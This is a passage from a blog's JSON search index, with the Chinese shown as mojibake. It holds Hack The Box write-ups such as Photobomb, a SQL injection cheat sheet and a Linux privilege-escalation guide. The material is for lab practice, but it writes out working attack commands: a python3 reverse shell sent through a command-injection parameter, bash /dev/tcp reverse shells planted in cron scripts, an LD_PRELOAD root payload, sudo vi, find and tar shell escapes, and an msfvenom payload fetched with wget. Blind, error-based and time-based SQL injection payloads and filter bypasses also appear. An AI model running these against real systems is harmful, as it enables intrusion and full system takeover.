æŸ¥çœ‹ç”¨æˆ·èƒ½æ‰§è¡Œçš„é«˜æƒé™å‘½ä»¤\n\nå‘ç°postgresè´¦å·å¯ä»¥ä»¥rootæƒé™è¿è¡Œviï¼Œåœ¨viä¸­æ˜¯å¯ä»¥è°ƒç”¨shellçš„ã€‚\næ‰§è¡Œå‘½ä»¤ä»¥rootæƒé™æ‰“å¼€vi sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\næŒ‰: è¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œè¾“å…¥!&#x2F;bin&#x2F;bash,å‘½ä»¤å«ä¹‰ä¸ºä»¥shellå‘½ä»¤çš„æ–¹å¼æ‰§è¡Œ /bin/bashï¼Œä¹Ÿå°±æ˜¯æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ç»ˆç«¯ã€‚æ„Ÿå¹å·ä¸ºå¼ºåˆ¶æ‰§è¡Œã€‚\nåœ¨æˆ‘ä»¬æ‰§è¡Œviæ—¶ï¼Œä¼šè°ƒç”¨shell,ç”±äºviæ˜¯ä»¥rootæƒé™æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆè°ƒç”¨çš„shellä¹Ÿæ˜¯rootæƒé™ä¸‹çš„\n\nå¾—åˆ°root flag\n","tags":["æ‰“é¶","HTB"]},{"title":"Photobombé¶æœº","url":"/2023/02/05/Photobomb%E9%9D%B6%E6%9C%BA/","content":"\n\n\nnmapæ‰«æ\n\nè®¿é—®80ç«¯å£ç½‘é¡µï¼Œåœ¨æ­¤ä¹‹å‰è¦å…ˆå»hostæ–‡ä»¶å°†ipåŸŸåç»‘å®šã€‚\n\nä¸‹é¢æœ‰ä¸ªç‚¹å‡»æŒ‰é’®ï¼Œå¼¹å‡ºä¸€ä¸ªç™»å½•æ¡†\n\nF12,çœ‹åˆ°jsæ–‡ä»¶ä¿¡æ¯æ³„éœ²\n\nä½¿ç”¨ç”¨æˆ·åå¯†ç ç™»å½•\n\næ˜¯ä¸ªå›¾ç‰‡ä¸‹è½½ç«™ï¼Œå¯ä»¥ä¸‹è½½æ–‡ä»¶ï¼Œæ²¡ä¿¡æ¯æŠ“ä¸ªåŒ…\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªå¯æ§å‚æ•°\næµ‹è¯•ä¸€ä¸‹è¿™äº›å‚æ•°æœ‰æ²¡æœ‰å‘½ä»¤æ³¨å…¥ï¼Œå¼€ä¸€ä¸ªç›‘å¬\n\næµ‹è¯•åˆ°filetypeå‚æ•°æ—¶ï¼ŒæˆåŠŸã€‚\n\nåå¼¹shell\nåˆ©ç”¨shellç”Ÿæˆç½‘ç«™ç”Ÿæˆ\n\nexport RHOST=&quot;10.10.16.6&quot;;export RPORT=6666;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39;\n\næ³¨æ„ï¼Œæ”¾å…¥bpæ—¶ï¼Œéœ€è¦æŠŠç©ºæ ¼æ›¿æ¢æˆ+\n\næ‹¿åˆ°æ™®é€šç”¨æˆ·shell\n\næ‹¿åˆ°userflagï¼š87ad4f92660fd0582bf4be5dee6c7bb2\nææƒ\nå…ˆæŸ¥çœ‹å½“å‰ç”¨æˆ·èƒ½ç”¨sudoæ‰§è¡Œäº›ä»€ä¹ˆ\n\næœ‰ä¸€ä¸ªrootæƒé™çš„bashè„šæœ¬ï¼ŒæŸ¥çœ‹æ–‡ä»¶ï¼ŒåŠŸèƒ½ä¸ºæ¸…ç†æ—¥å¿—æ–‡ä»¶ï¼Œè·å–æ—¥å¿—æ–‡ä»¶å¹¶å°†å…¶å†…å®¹ç§»åŠ¨åˆ°photobomb.log.oldç„¶åä½¿ç”¨truncateæ¸…é™¤photobomb.log\n#!/bin/bash\n. /opt/.bashrc\ncd /home/wizard/photobomb\n\n# clean up log files\nif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]\nthen\n  /bin/cat log/photobomb.log &gt; log/photobomb.log.old\n  /usr/bin/truncate -s0 log/photobomb.log\nfi\n\n# protect the priceless originals\nfind source_images -type f -name &#39;*.jpg&#39; -exec chown root:root &#123;&#125; \\;è¿™é‡Œä½¿ç”¨åˆ°çš„æ˜¯ç›¸å¯¹è·¯å¾„è€Œä¸æ˜¯ç»å¯¹è·¯å¾„\n\nåœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªfindæ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸€ä¸ªshellï¼Œå°†ç¯å¢ƒå˜é‡æ”¹ä¸ºå½“å‰ç›®å½•ï¼Œsudoæ‰§è¡Œcleanup.sh\n\næ‹¿åˆ°rootæƒé™shell ï¼Œå¾—åˆ°rootflagï¼šbad337481d54051abd1e86a01ce42933\n\nç¯å¢ƒå˜é‡ææƒï¼Œç›¸å…³é“¾æ¥https://juejin.cn/post/7165030726461718535\n\n","tags":["æ‰“é¶","HTB"]},{"title":"Hello World","url":"/2022/10/15/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"SQLæ³¨å…¥å­¦ä¹ ç¬”è®°","url":"/2020/04/07/sql%E6%B3%A8%E5%85%A5/","content":"åŸºç¡€çŸ¥è¯†æ³¨å…¥çš„åˆ†ç±»åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”â–²åŸºäºé”™è¯¯çš„ SQL æ³¨å…¥â–²è”åˆæŸ¥è¯¢çš„ç±»å‹â–²å †æŸ¥è¯¢æ³¨å°„â–²SQL ç›²æ³¨â€¢åŸºäºå¸ƒå°” SQL ç›²æ³¨â€¢åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨â€¢åŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„ SQL æŸ¥è¯¢ï¼ˆæ•°æ®ç±»å‹ï¼‰â–²åŸºäºå­—ç¬¦ä¸²â–²æ•°å­—æˆ–æ•´æ•°ä¸ºåŸºç¡€çš„åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„â–²é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„ã€‚â–²é€šè¿‡ cookie æ³¨å°„ã€‚â–²é€šè¿‡æœåŠ¡å™¨å˜é‡æ³¨å°„ã€‚ ï¼ˆåŸºäºå¤´éƒ¨ä¿¡æ¯çš„æ³¨å°„ï¼‰ç³»ç»Ÿå‡½æ•°\nversion()â€”â€”MySQL ç‰ˆæœ¬\nuser()â€”â€”æ•°æ®åº“ç”¨æˆ·å\ndatabase()â€”â€”æ•°æ®åº“å \n@@datadirâ€”â€”æ•°æ®åº“è·¯å¾„\n@@version_compile_osâ€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬\n\nå­—ç¬¦ä¸²è¿æ¥å‡½æ•°\nconcat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²\nconcat_ws(separator,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²\ngroup_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®\n\nä¸€èˆ¬æµç¨‹çŒœæ•°æ®åº“select schema_name from information_schema.schemataçŒœæŸåº“çš„æ•°æ®è¡¨select table_name from information_schema.tables where table_schema&#x3D;â€™xxxxxâ€™çŒœæŸè¡¨çš„æ‰€æœ‰åˆ—select column_name from information_schema.columns where table_name&#x3D;â€™xxxxxâ€™è·å–æŸåˆ—çš„å†…å®¹select *** from ****PSï¼šä¸€èˆ¬éƒ½ä¼šç”¨åˆ°group_concatæ¥æ˜¾ç¤ºæ‰€æœ‰æ•°æ®ã€‚\nç›²æ³¨åŸºäºå¸ƒå°” SQL ç›²æ³¨â€”â€”â€”-æ„é€ é€»è¾‘åˆ¤æ–­â–²left(database(),1)&gt;â€™sâ€™ &#x2F;&#x2F;left()å‡½æ•°Explain:database()æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼Œleft(a,b)ä»å·¦ä¾§æˆªå– a çš„å‰b ä½\nâ–²ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 â€“+ &#x2F;&#x2F;substr()å‡½æ•°ï¼Œascii()å‡½æ•°Explainï¼šsubstr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ã€‚Ascii()å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸º ascii å€¼ \nâ–²ascii(substr((select database()),1,1))&#x3D;98â–²ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()å‡½æ•°ï¼ŒMID()å‡½æ•°Explainï¼šmid(a,b,c)ä»ä½ç½® b å¼€å§‹ï¼Œæˆªå– a å­—ç¬¦ä¸²çš„ c ä½ Ord()å‡½æ•°åŒ ascii()ï¼Œå°†å­—ç¬¦è½¬ä¸º ascii å€¼\nâ–²regexp æ­£åˆ™æ³¨å…¥ select user() regexp â€˜^[a-z]â€™;Explainï¼šæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œuser()ç»“æœä¸º rootï¼Œregexp ä¸ºåŒ¹é… root çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä½å¯ä»¥ç”¨ select user() regexp â€˜^roâ€™æ¥è¿›è¡Œã€‚\nâ–²like åŒ¹é…æ³¨å…¥select user() like â€˜ro%â€™\nåŸºäºæŠ¥é”™çš„ SQL ç›²æ³¨â€”â€”æ„é€  payload è®©ä¿¡æ¯é€šè¿‡é”™è¯¯æç¤ºå›æ˜¾å‡ºæ¥â–²extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql å¯¹xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯â–²updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql å¯¹xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯â–²select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº† versionï¼Œæ‰€ä»¥æŠ¥é”™ã€‚åŸºäºæ—¶é—´çš„ SQL ç›²æ³¨â€”â€”â€”-å»¶æ—¶æ³¨å…¥â–²If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if åˆ¤æ–­è¯­å¥ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œæ‰§è¡Œ sleepå¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œå¯¼å…¥åˆ°æ–‡ä»¶SELECTâ€¦..INTO OUTFILE â€˜file_nameâ€™\nSelect  â€¦â€¦ into outfile â€œc:\\phpnow\\htdocs\\test.phpâ€\nå¢åˆ æ”¹å‡½æ•°æ’å…¥insert into users values(â€˜16â€™,â€™lcamryâ€™,â€™lcamryâ€™);\nåˆ é™¤åˆ æ•°æ®: delete from \nè¡¨å; delete from è¡¨å where id&#x3D;1; \n åˆ é™¤ç»“æ„ï¼š \nåˆ æ•°æ®åº“ï¼šdrop database æ•°æ®åº“å; \nåˆ é™¤è¡¨ï¼šdrop table è¡¨å; \nåˆ é™¤è¡¨ä¸­çš„åˆ—:alter table è¡¨å drop column åˆ—å;\nps:delete from users where id&#x3D;16\nä¿®æ”¹&#x2F;æ›´æ–°ä¿®æ”¹æ‰€æœ‰ï¼šupdata è¡¨å set åˆ—å&#x3D;â€™æ–°çš„å€¼ï¼Œéæ•°å­—åŠ å•å¼•å·â€™ ; \nå¸¦æ¡ä»¶çš„ä¿®æ”¹ï¼šupdata è¡¨å set åˆ—å&#x3D;â€™æ–°çš„å€¼ï¼Œéæ•°å­—åŠ å•å¼•å·â€™ where id&#x3D;6;\nps: update users set username&#x3D;â€™ttâ€™ where id&#x3D;15\nHTTP å¤´éƒ¨å¦‚ä½•ç»•è¿‡ or å’Œ and è¿‡æ»¤ã€‚ä¸€èˆ¬æ€§æä¾›ä»¥ä¸‹å‡ ç§æ€è·¯ï¼š\nï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oR \nï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode \nï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š&#x2F;or&#x2F; \nï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and&#x3D;&amp;&amp; or&#x3D;||\nå¯¹äºæ³¨é‡Šå’Œç»“å°¾å­—ç¬¦çš„æˆ‘ä»¬æ­¤å¤„åªèƒ½åˆ©ç”¨æ„é€ ä¸€ä¸ª â€™ æ¥é—­åˆåé¢åˆ° â€™ ï¼›\nå¯¹äºç©ºæ ¼ï¼Œæœ‰è¾ƒå¤šçš„æ–¹æ³•ï¼š\n %09 TAB é”®ï¼ˆæ°´å¹³ï¼‰\n %0a æ–°å»ºä¸€è¡Œ\n %0c æ–°çš„ä¸€é¡µ\n %0d return åŠŸèƒ½ \n%0b TAB é”®ï¼ˆå‚ç›´ï¼‰\n %a0 ç©ºæ ¼\n","categories":["ç¬”è®°"],"tags":["SQLæ³¨å…¥"]},{"title":"linuxææƒ","url":"/2023/02/25/linux%E6%8F%90%E6%9D%83/","content":"å‰è¨€  è¿™é‡Œé€šè¿‡ç®€å•é¶åœºä¸¾ä¾‹è¯´æ˜ï¼Œäº†è§£ææƒçš„åŸºç¡€å§¿åŠ¿ã€‚\n\n\nææƒæ£€æµ‹è„šæœ¬  åœ¨æ‹¿åˆ°æ™®é€šç”¨æˆ·shellåï¼Œå¯ä»¥æ‰‹åŠ¨è¾“å…¥å‘½ä»¤2æ¥æŸ¥è¯¢ç³»ç»Ÿä¿¡æ¯ã€ç”¨æˆ·ä¿¡æ¯ã€æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€ç¬¬ä¸‰æ–¹è½¯ä»¶ç­‰ç­‰å¯èƒ½ç”¨æ¥ææƒçš„ç‚¹ã€‚åŒæ—¶ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ç°æˆçš„æ”¶é›†è„šæœ¬æ¥è¿›è¡Œæ”¶é›†ï¼Œè¿™é‡Œä»‹ç»linpeasè„šæœ¬ï¼Œé“¾æ¥å¦‚ä¸‹ï¼šhttps://github.com/carlospolop/PEASS-ng/tree/master/linPEASã€‚é˜…è¯»å®˜æ–¹æ–‡æ¡£ï¼Œæ­¤è„šæœ¬å¯ä»¥æ”¶é›†åˆ°ç³»ç»Ÿä¿¡æ¯ã€é©±åŠ¨å™¨ã€å·²å®‰è£…è½¯ä»¶ã€è¿›ç¨‹ä¿¡æ¯ã€å®šæ—¶ä½œä¸šã€æœåŠ¡ç­‰ç­‰ä¿¡æ¯ã€‚è¿˜æœ‰å…¶ä»–ä¸€äº›è„šæœ¬ï¼ŒåŸç†å¤§åŒå°å¼‚ï¼Œè¿™é‡Œä¸åšä»‹ç»äº†ã€‚\n\nLinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\nLinEnum: https://github.com/rebootuser/LinEnum\nLES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester\nLinux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration\nLinux Priv Checker: https://github.com/linted/linuxprivchecker\n\nsudoææƒå‘½ä»¤ææƒ  é»˜è®¤æƒ…å†µä¸‹ï¼Œsudoå‘½ä»¤å…è®¸ç”¨æˆ·ä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤&#x2F;è¿è¡Œç¨‹åºï¼ŒæŸäº›æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜ä¼šå…è®¸æ™®é€šç”¨æˆ·æä¾›ä¸€äº›çµæ´»çš„æƒé™ï¼Œä¾‹å¦‚ï¼Œæ™®é€šç”¨æˆ·éœ€è¦ä½¿ç”¨nmapï¼Œè€Œåˆä¸æƒ³è®©æ™®é€šç”¨æˆ·å¾—åˆ°å®Œå…¨çš„rootæƒé™ï¼Œæ­¤æ—¶ï¼Œrootç”¨æˆ·å¯ä»¥å…è®¸æ™®é€šç”¨æˆ·ä»…ä»¥rootæƒé™è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œåœ¨å…¶ä»–åº”ç”¨ç¨‹åºç»´æŒåŸæ¥çš„æƒé™çº§åˆ«ã€‚\n  ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨sudo -lå‘½ä»¤æŸ¥çœ‹å½“å‰ä¸rootæƒé™ç›¸å…³çš„æƒ…å†µã€‚\nuser@debian:~$ sudo -l\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n    (root) NOPASSWD: /usr/sbin/iftop\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/nano\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/man\n    (root) NOPASSWD: /usr/bin/awk\n    (root) NOPASSWD: /usr/bin/less\n    (root) NOPASSWD: /usr/bin/ftp\n    (root) NOPASSWD: /usr/bin/nmap\n    (root) NOPASSWD: /usr/sbin/apache2\n    (root) NOPASSWD: /bin/more\n\n  åœ¨æ­¤ä¾‹ä¸­ï¼Œæœ‰11ä¸ªå‘½ä»¤å…è®¸ä»¥rootæƒé™æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨æ­¤å‘½ä»¤çš„æŸäº›åŠŸèƒ½æ¥è·å¾—ç‰¹æƒ shellã€‚å¯ä»¥é€šè¿‡æŸ¥é˜…æ­¤ç½‘ç«™æ¥æŸ¥è¯¢å„ç§å‘½ä»¤ææƒçš„ä½¿ç”¨æ–¹æ³•https://gtfobins.github.io/ã€‚ä¾‹å¦‚ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨findå‘½ä»¤æ¥è¿›è¡Œsudoææƒã€‚\nuser@debian:~$ sudo find . -exec /bin/sh \\; -quit\nsh-4.1# whoami\nroot\nsh-4.1# id\nuid=0(root) gid=0(root) groups=0(root)\nsh-4.1# \n\nç¯å¢ƒå˜é‡  å¦‚æœæ‚¨åœ¨ sudo -l çš„è¾“å‡ºä¸­å‘ç°ä»¥ä¸‹å¥å­ï¼šenv_keep+&#x3D;LD_PRELOAD å¹¶ä¸”æ‚¨å¯ä»¥ä½¿ç”¨ sudo è°ƒç”¨ä¸€äº›å‘½ä»¤ï¼Œåˆ™å¯ä»¥æå‡æƒé™ã€‚å¦‚ä¸‹ï¼š\nuser@debian:~$ sudo -l\nMatching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n\n  LD_PRELOAD å’Œ LD_LIBRARY_PATH éƒ½ç»§æ‰¿è‡ªç”¨æˆ·ç¯å¢ƒã€‚LD_PRELOAD åœ¨ç¨‹åºè¿è¡Œæ—¶å…ˆåŠ è½½ä¸€ä¸ªå…±äº«å¯¹è±¡ã€‚ LD_LIBRARY_PATH æä¾›é¦–å…ˆæœç´¢å…±äº«åº“çš„ç›®å½•åˆ—è¡¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶ LD_LIBRARY_PATH env å˜é‡ï¼Œåˆ™å¯èƒ½ä¼šæ»¥ç”¨ç±»ä¼¼çš„æƒé™ï¼Œå› ä¸ºä»–æ§åˆ¶ç€è¦æœç´¢åº“çš„è·¯å¾„ã€‚é€šè¿‡æ”¹å˜ç¯å¢ƒå˜é‡ï¼Œä½¿å¾—ç¨‹åºè¿è¡Œæ—¶æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ã€‚\n  å¦å­˜ä¸º&#x2F;tmp&#x2F;pe.c\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() &#123;\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    setgid(0);\n    setuid(0);\n    system(&quot;/bin/bash&quot;);\n&#125;\n\n  ç„¶åç¼–è¯‘å®ƒä½¿ç”¨ï¼š\ncd /tmp\ngcc -fPIC -shared -o pe.so pe.c -nostartfiles\n\n  æœ€åè¿è¡Œææƒ\nsudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo\n\nä¾‹å¦‚ï¼š\nuser@debian:~$ vim /tmp/pe.c\nuser@debian:~$ cd /tmp\nuser@debian:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles\nuser@debian:/tmp$ sudo LD_PRELOAD=./pe.so apache2\nroot@debian:/tmp# \n\næ³¨æ„æœ€åä¸€è¡Œå·²ç»å˜æˆäº†rootæƒé™shell\nCronä½œä¸š  Cronä½œä¸šç”¨äºåœ¨ç‰¹å®šæ—¶é—´è¿è¡Œè„šæœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä»¬ä»¥å…¶æ‰€æœ‰è€…è€Œéå½“å‰ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚\næ–‡ä»¶æƒé™  å¦‚æœæœ‰ä¸€ä¸ªä»¥ root æƒé™è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ›´æ”¹å°†è¦è¿è¡Œçš„è„šæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è„šæœ¬å°†ä»¥ root æƒé™è¿è¡Œã€‚\n  Cron è¡¨æ–‡ä»¶ (crontabs) å­˜å‚¨ cron ä½œä¸šçš„é…ç½®ã€‚crontab ä½äº &#x2F;etc&#x2F;crontabã€‚æŸ¥çœ‹æ­¤æ–‡ä»¶ï¼š\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don&#39;t have to run the `crontab&#39;\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / &amp;&amp; run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\n\n  å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªè®¡åˆ’è¿è¡Œçš„ä½œä¸šï¼Œä¸€ä¸ªä¸ºoverwrite.shï¼Œå¦ä¸€ä¸ªä¸º&#x2F;usr&#x2F;local&#x2F;bin&#x2F;compress.shã€‚\n  æ‰¾åˆ°overwrite.shæ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼Œå¹¶æŸ¥çœ‹æ­¤æ–‡ä»¶æƒé™\nuser@debian:~$ locate overwrite.sh\nlocate: warning: database `/var/cache/locate/locatedb&#39; is more than 8 days old (actual age is 1016.0 days)\n/usr/local/bin/overwrite.sh\nuser@debian:~$ ls -l /usr/local/bin/overwrite.sh\n-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh\n\n  å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶ä½äº&#x2F;usr&#x2F;local&#x2F;bin&#x2F;overwrite.shï¼Œå¹¶ä¸”å…¨å±€å¯å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†æ­¤æ–‡ä»¶å†…å®¹æ›´æ”¹ã€‚\n  å°†æ–‡ä»¶å†…å®¹æ”¹ä¸ºåå¼¹shellçš„å‘½ä»¤\n!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.18.47.107/4444 0&gt;&amp;1\n\n  æœ¬æœºå¼€å¯ç›‘å¬ï¼Œç­‰å¾…cronä½œä¸šæ‰§è¡Œ\nâ”Œâ”€â”€(n3ym4rã‰¿kali)-[~]\nâ””â”€$ nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.18.47.107] from (UNKNOWN) [10.10.80.4] 38638\nbash: no job control in this shell\nroot@debian:~# \n\n  å¾—åˆ°rootæƒé™\nPATH ç¯å¢ƒå˜é‡åœ¨&#x2F;etc&#x2F;crontabæ–‡ä»¶å¯ä»¥çœ‹åˆ°ï¼ŒPATHä¸ºPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binï¼Œæˆ‘ä»¬å¯ä»¥åœ¨&#x2F;home&#x2F;userç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªoverwrite.shè„šæœ¬å¦‚ä¸‹ï¼š\n#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n\n  ç„¶åï¼Œç¡®ä¿æ­¤è„šæœ¬æœ‰æ‰§è¡Œæƒé™ï¼šchmod +x /home/user/overwrite.sh\n  ç­‰å¾…ç³»ç»Ÿæ‰§è¡Œä½œä¸šï¼Œä½¿ç”¨ -p è¿è¡Œ &#x2F;tmp&#x2F;rootbash å‘½ä»¤ä»¥è·å¾—ä»¥ root æƒé™è¿è¡Œçš„ shell\nuser@debian:~$ /tmp/rootbash -p\nrootbash-4.1# whoami\nroot\n\né€šé…ç¬¦æŸ¥çœ‹å¦ä¸€ä¸ªä½œä¸šæ–‡ä»¶\nsh-4.1$ cat /usr/local/bin/compress.sh \n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\nsh-4.1$ \n\nå¯ä»¥çœ‹åˆ°è„šæœ¬å‘½ä»¤ä¸ºåˆ‡æ¢åˆ°&#x2F;home&#x2F;userç›®å½•ä¸‹ï¼Œç„¶åæŠŠç›®å½•é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½å‹ç¼©ï¼Œç”Ÿæˆä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‘½åä¸ºbackup.tar.gzã€‚\né€šè¿‡æŸ¥é˜…https://gtfobins.github.io/gtfobins/tar/ï¼Œå¾—åˆ°`tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null â€“checkpoint&#x3D;1 â€“checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh&#96;ä½¿ç”¨æ­¤å‘½ä»¤å¯æ‹¿åˆ°shellã€‚\né‚£ä¹ˆå¯ä»¥åœ¨ç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶\né¦–å…ˆåœ¨æœ¬åœ°ä½¿ç”¨msfç”Ÿæˆshell.elf\nâ”Œâ”€â”€(n3ym4rã‰¿kali)-[~]\nâ””â”€$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.47.107 LPORT=9999 -f elf -o shell.elf\n\n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf file: 194 bytes\nSaved as: shell.elf\n\nç„¶åï¼Œåœ¨æœ¬åœ°å¼€ä¸€ä¸ªserver\nâ”Œâ”€â”€(n3ym4rã‰¿kali)-[~]shell\nâ””â”€$ python3 -m http.server 80      \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n127.0.0.1 - - [25/Feb/2023 19:21:08] &quot;GET / HTTP/1.1&quot; 200 -\n127.0.0.1 - - [25/Feb/2023 19:21:09] code 404, message File not found\n127.0.0.1 - - [25/Feb/2023 19:21:09] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -\n10.10.80.4 - - [25/Feb/2023 19:22:41] &quot;GET /shell.elf HTTP/1.0&quot; 200 -\n\nåœ¨ä¸»æœºä¸‹è½½\nuser@debian:~$ wget http://10.18.47.107/shell.elf\n--2023-02-25 06:22:40--  http://10.18.47.107/shell.elf\nConnecting to 10.18.47.107:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 194 [application/octet-stream]\nSaving to: â€œshell.elfâ€\n\n100%[============================================================================&gt;] 194         --.-K/s   in 0s      \n\n2023-02-25 06:22:41 (60.0 MB/s) - â€œshell.elfâ€ saved 